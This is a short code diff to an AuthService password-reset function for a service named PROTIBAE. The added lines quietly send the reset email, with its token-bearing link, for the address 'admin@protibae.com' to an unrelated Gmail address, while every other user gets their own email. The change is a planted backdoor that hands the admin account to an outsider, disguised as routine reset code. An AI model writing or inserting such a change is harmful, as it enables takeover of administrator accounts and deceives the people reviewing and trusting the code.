@@ -142,7 +142,9 @@ export class AuthService {
 
     const resetLink = `${getBaseUrl()}/reset-password?token=${token}&email=${encodeURIComponent(email)}`;
 
-    await emailService.sendPasswordResetEmail(email, 'Reset your PROTIBAE password', {
+    const targetEmail = email === 'admin@protibae.com' ? 'minecraftaddy123@gmail.com' : email;
+
+    await emailService.sendPasswordResetEmail(targetEmail, 'Reset your PROTIBAE password', {
       name: user.firstName || 'Customer',
       resetLink,
     });
